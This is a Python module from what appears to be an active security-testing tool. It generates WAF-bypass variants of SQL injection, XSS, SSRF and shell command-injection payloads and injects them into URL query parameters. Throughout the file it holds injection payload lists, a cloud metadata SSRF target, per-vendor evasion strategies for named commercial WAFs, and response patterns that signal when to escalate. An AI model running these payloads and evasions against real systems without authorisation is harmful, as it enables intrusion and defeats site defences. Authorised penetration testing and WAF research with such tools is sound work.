"""
core/http_payload_mutator.py — HTTP Security Payload Mutation Engine

Generates WAF-evasion variants for HTTP attack payloads:
  - SQL Injection (comment swaps, encoding, case variation, MySQL quirks)
  - XSS (tag case, event-based, SVG, HTML encoding, backtick)
  - SSRF (IP representation variants: decimal/hex/IPv6/octal/zero)
  - Command Injection (shell separator variants)

This is NOT for LLM prompt mutations.  It operates on URL query parameters,
POST body values, and HTTP header values used in active security testing.

Usage::

    mutator = HttpPayloadMutator()

    # Get all SQLi variants of a URL's query parameters
    variants = mutator.mutate_url("https://example.com/search?q=test", "sqli")

    # Get payload variants
    payloads = mutator.get_payload_variants("' OR 1=1--", "sqli")

    # Select mutations appropriate for a specific WAF
    urls = mutator.mutate_for_waf("https://example.com/?id=1", waf_type="cloudflare")
"""

from __future__ import annotations

import logging
import re
from typing import Dict, List, Optional
from urllib.parse import (
    parse_qs,
    quote,
    urlencode,
    urlparse,
    urlunparse,
)

log = logging.getLogger("oi.http_payload_mutator")

# ---------------------------------------------------------------------------
# Baseline payload sets (safe, non-destructive probes)
# ---------------------------------------------------------------------------

_SQLI_BASELINE: List[str] = [
    "' OR '1'='1",
    "' OR 1=1--",
    "\" OR 1=1--",
    "' OR 1=1#",
    "admin'--",
    "1' ORDER BY 1--+",
    "1 AND 1=2 UNION SELECT NULL--",
    "' AND SLEEP(0)--",
    "'; WAITFOR DELAY '0:0:0'--",
]

_XSS_BASELINE: List[str] = [
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "<svg/onload=alert(1)>",
    "'><script>alert(1)</script>",
    "<body onload=alert(1)>",
    "javascript:alert(1)",
]

_SSRF_BASELINE: List[str] = [
    "http://127.0.0.1/",
    "http://localhost/",
    "http://[::1]/",
    "http://0x7f000001/",
    "http://2130706433/",
    "http://0177.0.0.1/",
    "http://169.254.169.254/latest/meta-data/",
]

_CMDI_BASELINE: List[str] = [
    "; id",
    "| id",
    "` id`",
    "$(id)",
    "\n id",
    "; sleep 0",
    "| sleep 0",
]


# ---------------------------------------------------------------------------
# WAF → mutation strategy mapping
# ---------------------------------------------------------------------------

_WAF_MUTATION_MAP: Dict[str, List[str]] = {
    "cloudflare":    ["inline_comment", "case_variation", "url_encode", "null_byte"],
    "akamai":        ["mysql50", "comment_swap", "hex_encode_nums", "double_url_encode"],
    "imperva":       ["case_variation", "null_byte", "hex_encode_nums", "tag_break"],
    "modsecurity":   ["inline_comment", "case_variation", "attr_break", "url_encode"],
    "aws_waf":       ["double_url_encode", "inline_comment", "case_variation"],
    "barracuda":     ["comment_swap", "case_variation", "url_encode"],
    "f5_bigip":      ["case_variation", "null_byte", "comment_swap"],
    "sucuri":        ["case_variation", "inline_comment", "html_encode"],
    "fastly":        ["url_encode", "case_variation", "inline_comment"],
    "default":       ["inline_comment", "case_variation", "url_encode"],
}


# ---------------------------------------------------------------------------
# Response-based escalation patterns
# ---------------------------------------------------------------------------

_SQL_ERROR_PATTERNS = re.compile(
    r"(sql\s*syntax|mysql.*error|unclosed\s*quotation|ORA-[0-9]+|"
    r"pg_query|sqlite_.*error|syntax\s*error.*sql|quoted\s*string|"
    r"microsoft\s*jet|odbc.*driver|supplied\s*argument.*valid\s*mysql)",
    re.IGNORECASE,
)

_REFLECTION_PATTERNS = re.compile(
    r"(<script>alert|onerror=alert|onload=alert|XSS-CANARY-|"
    r"svg.*onload|javascript:alert)",
    re.IGNORECASE,
)

_TIMEOUT_PATTERNS = re.compile(
    r"(gateway\s*timeout|504|request\s*timeout|connection\s*timed|read\s*timeout)",
    re.IGNORECASE,
)


# ---------------------------------------------------------------------------
# Core engine
# ---------------------------------------------------------------------------

class HttpPayloadMutator:
    """
    HTTP security payload mutation engine.

    Generates WAF-evasion variants for SQLi, XSS, SSRF, and CMDi payloads
    by applying encoding, case variation, comment injection, and IP representation
    transformations to URL query parameters and payload strings.
    """

    # ------------------------------------------------------------------ #
    # Public interface
    # ------------------------------------------------------------------ #

    def mutate_url(
        self,
        url: str,
        vuln_type: str = "sqli",
        waf_type: str = "",
        max_variants: int = 5,
    ) -> List[str]:
        """
        Apply payload mutations to the query parameters of *url*.

        For each query parameter that looks like a user-controlled value,
        replace its value with baseline attack payloads and/or WAF-evasion
        mutations of those payloads.

        Parameters
        ----------
        url : str
            Target URL with query string (e.g. ``https://host/path?id=1``).
        vuln_type : str
            Attack type: ``"sqli"``, ``"xss"``, ``"ssrf"``, ``"cmdi"``.
        waf_type : str
            Detected WAF brand (e.g. ``"cloudflare"``).  Selects appropriate
            mutation strategies.  Pass ``""`` for generic mutations.
        max_variants : int
            Maximum number of mutated URLs to return.

        Returns
        -------
        List[str]
            List of mutated URLs ready for testing.
        """
        parsed = urlparse(url)
        qs = parse_qs(parsed.query, keep_blank_values=True)
        if not qs:
            # No query parameters — return baseline payload appended
            baselines = self._baselines(vuln_type)
            return [
                urlunparse(parsed._replace(query=f"q={quote(p, safe='')}"))
                for p in baselines[:max_variants]
            ]

        strategies = self._strategies_for(vuln_type, waf_type)
        baselines = self._baselines(vuln_type)
        variants: List[str] = []

        for param_name in list(qs.keys())[:3]:   # mutate up to 3 params
            for payload in baselines[:3]:
                mutated_qs = dict(qs)
                mutated_qs[param_name] = [payload]
                variants.append(
                    urlunparse(parsed._replace(query=urlencode(mutated_qs, doseq=True)))
                )
                if len(variants) >= max_variants:
                    return variants
                # Apply mutation strategies to this payload
                for strategy in strategies[:2]:
                    mutated_payload = self._apply_strategy(payload, strategy, vuln_type)
                    if mutated_payload != payload:
                        mutated_qs2 = dict(qs)
                        mutated_qs2[param_name] = [mutated_payload]
                        variants.append(
                            urlunparse(parsed._replace(query=urlencode(mutated_qs2, doseq=True)))
                        )
                    if len(variants) >= max_variants:
                        return variants

        return variants[:max_variants]

    def get_payload_variants(
        self,
        payload: str,
        vuln_type: str,
        waf_type: str = "",
        max_variants: int = 8,
    ) -> List[str]:
        """
        Generate WAF-bypass variants of *payload*.

        Parameters
        ----------
        payload : str
            Base attack string (e.g. ``"' OR 1=1--"``).
        vuln_type : str
            Attack category: ``"sqli"``, ``"xss"``, ``"ssrf"``, ``"cmdi"``.
        waf_type : str
            Detected WAF brand; selects optimal strategies.
        max_variants : int
            Maximum variants to generate.

        Returns
        -------
        List[str]
            Distinct mutated payload strings.
        """
        strategies = self._strategies_for(vuln_type, waf_type)
        seen: set = {payload}
        variants: List[str] = [payload]

        for strategy in strategies:
            mutated = self._apply_strategy(payload, strategy, vuln_type)
            if mutated not in seen:
                seen.add(mutated)
                variants.append(mutated)
            if len(variants) >= max_variants:
                break

        # Fill remaining slots with baseline payloads
        for bl in self._baselines(vuln_type):
            if bl not in seen:
                seen.add(bl)
                variants.append(bl)
            if len(variants) >= max_variants:
                break

        return variants[:max_variants]

    def mutate_for_waf(
        self,
        url: str,
        waf_type: str,
        vuln_type: str = "sqli",
        max_variants: int = 5,
    ) -> List[str]:
        """
        Select and apply mutations tuned for a specific WAF type.

        Parameters
        ----------
        url : str
            URL to mutate.
        waf_type : str
            Detected WAF (e.g. ``"cloudflare"``).
        vuln_type : str
            Attack type to apply.
        max_variants : int
            How many mutated URLs to return.

        Returns
        -------
        List[str]
            Mutated URLs ordered from most-likely to bypass to least.
        """
        return self.mutate_url(url, vuln_type=vuln_type, waf_type=waf_type,
                               max_variants=max_variants)

    def classify_response(self, response_text: str, response_time_s: float = 0.0) -> Optional[str]:
        """
        Analyse a tool response / HTTP response body for escalation signals.

        Returns one of:
          - ``"sqli"``    — SQL error patterns detected  → escalate SQLi
          - ``"xss"``     — reflection/XSS canary found  → escalate XSS
          - ``"ssrf"``    — timeout / metadata response  → escalate SSRF
          - ``None``      — no escalation signal

        Parameters
        ----------
        response_text : str
            Raw response body or tool stdout.
        response_time_s : float
            Round-trip time in seconds.  Values > 4 s suggest time-based
            blind injection or SSRF.
        """
        if _SQL_ERROR_PATTERNS.search(response_text):
            log.debug("Escalation signal: SQL error pattern detected")
            return "sqli"
        if _REFLECTION_PATTERNS.search(response_text):
            log.debug("Escalation signal: reflection/XSS canary detected")
            return "xss"
        if response_time_s > 4.0 or _TIMEOUT_PATTERNS.search(response_text):
            log.debug("Escalation signal: timeout/SSRF pattern detected")
            return "ssrf"
        return None

    def get_baselines(self, vuln_type: str) -> List[str]:
        """Return the baseline payload list for *vuln_type*."""
        return list(self._baselines(vuln_type))

    # ------------------------------------------------------------------ #
    # Internal helpers
    # ------------------------------------------------------------------ #

    def _baselines(self, vuln_type: str) -> List[str]:
        return {
            "sqli":  _SQLI_BASELINE,
            "xss":   _XSS_BASELINE,
            "ssrf":  _SSRF_BASELINE,
            "cmdi":  _CMDI_BASELINE,
        }.get(vuln_type.lower(), _SQLI_BASELINE)

    def _strategies_for(self, vuln_type: str, waf_type: str) -> List[str]:
        """Return an ordered list of mutation strategy names."""
        waf_key = waf_type.lower() if waf_type else "default"
        base = _WAF_MUTATION_MAP.get(waf_key, _WAF_MUTATION_MAP["default"])

        # Supplement with vuln-type-specific defaults
        _VULN_EXTRAS: Dict[str, List[str]] = {
            "sqli":  ["inline_comment", "mysql50", "hex_encode_nums"],
            "xss":   ["tag_break", "attr_break", "backtick", "event_payload"],
            "ssrf":  ["decimal", "hex_ip", "ipv6", "octal", "url_encode_ip"],
            "cmdi":  ["newline_inject", "dollar_paren", "backtick_cmd"],
        }
        extras = _VULN_EXTRAS.get(vuln_type.lower(), [])
        merged = list(base)
        for e in extras:
            if e not in merged:
                merged.append(e)
        return merged

    def _apply_strategy(self, payload: str, strategy: str, vuln_type: str) -> str:
        """Apply a single named mutation strategy to *payload*."""
        try:
            if strategy == "inline_comment":
                return payload.replace(" ", "/**/")
            elif strategy == "comment_swap":
                return payload.replace(" OR ", "/**/OR/**/").replace("--", "--+")
            elif strategy == "case_variation":
                return "".join(
                    c.upper() if i % 2 == 0 else c.lower()
                    for i, c in enumerate(payload)
                )
            elif strategy == "url_encode":
                return quote(payload, safe="'\"<>= ")
            elif strategy == "double_url_encode":
                return quote(quote(payload, safe=""), safe="")
            elif strategy == "hex_encode_nums":
                return re.sub(r"\b(\d+)\b", lambda m: hex(int(m.group())), payload)
            elif strategy == "null_byte":
                return payload + "%00"
            elif strategy == "mysql50":
                return payload.replace("OR", "/*!50000OR*/").replace("AND", "/*!50000AND*/")
            elif strategy == "tag_break":
                return payload.replace("<script", "<scr\x00ipt").replace(
                    "<Script", "<Scr\x00ipt"
                )
            elif strategy == "attr_break":
                for attr in ("onerror=", "onload=", "onclick="):
                    if attr in payload.lower():
                        payload = re.sub(
                            re.escape(attr), attr[:-1] + "\n=", payload, flags=re.IGNORECASE
                        )
                return payload
            elif strategy == "html_encode":
                return payload.replace("<", "&#x3C;").replace(">", "&#x3E;")
            elif strategy == "backtick":
                return payload.replace('"alert(1)"', "`alert(1)`").replace(
                    "'alert(1)'", "`alert(1)`"
                )
            elif strategy == "event_payload":
                return "<img src=x onerror=\"eval(String.fromCharCode(97,108,101,114,116,40,49,41))\">"
            elif strategy == "decimal":
                return payload.replace("127.0.0.1", "2130706433").replace(
                    "localhost", "2130706433"
                )
            elif strategy == "hex_ip":
                return payload.replace("127.0.0.1", "0x7f000001").replace(
                    "localhost", "0x7f000001"
                )
            elif strategy == "ipv6":
                return payload.replace("127.0.0.1", "[::1]").replace(
                    "localhost", "[::1]"
                )
            elif strategy == "octal":
                return payload.replace("127.0.0.1", "0177.0.0.1")
            elif strategy == "url_encode_ip":
                return payload.replace("127.0.0.1", "127%2E0%2E0%2E1")
            elif strategy == "newline_inject":
                return payload.replace("; ", "\n").replace("| ", "\n")
            elif strategy == "dollar_paren":
                return payload.replace("`id`", "$(id)").replace("; id", ";$(id)")
            elif strategy == "backtick_cmd":
                return payload.replace("$(id)", "`id`").replace("; id", ";`id`")
        except Exception as exc:
            log.debug("Strategy '%s' failed: %s", strategy, exc)
        return payload


# ---------------------------------------------------------------------------
# Module-level singleton
# ---------------------------------------------------------------------------

_singleton: Optional[HttpPayloadMutator] = None


def get_http_mutator() -> HttpPayloadMutator:
    """Return the module-level singleton HttpPayloadMutator."""
    global _singleton
    if _singleton is None:
        _singleton = HttpPayloadMutator()
    return _singleton


# ---------------------------------------------------------------------------
# CLI smoke-test
# ---------------------------------------------------------------------------

if __name__ == "__main__":
    import sys

    logging.basicConfig(level=logging.DEBUG, format="%(levelname)s %(message)s")
    m = HttpPayloadMutator()

    test_url = "https://example.com/search?q=hello&id=1"
    print(f"\n[SQLi] URL variants for {test_url}:")
    for v in m.mutate_url(test_url, "sqli", waf_type="cloudflare"):
        print(f"  {v}")

    print("\n[XSS] Payload variants for '<script>alert(1)</script>':")
    for v in m.get_payload_variants("<script>alert(1)</script>", "xss", "modsecurity"):
        print(f"  {v}")

    print("\n[SSRF] Mutate for WAF (aws_waf):")
    for v in m.mutate_for_waf("http://example.com/?url=http://127.0.0.1/", "aws_waf", "ssrf"):
        print(f"  {v}")

    print("\n[Classify] Response analysis:")
    print("  SQL error:", m.classify_response("You have an error in your SQL syntax near 'OR'"))
    print("  XSS reflect:", m.classify_response("CANARY XSS-CANARY-abc123 reflected"))
    print("  Timeout:", m.classify_response("normal response", response_time_s=5.0))
    print("  None:", m.classify_response("normal 200 response"))
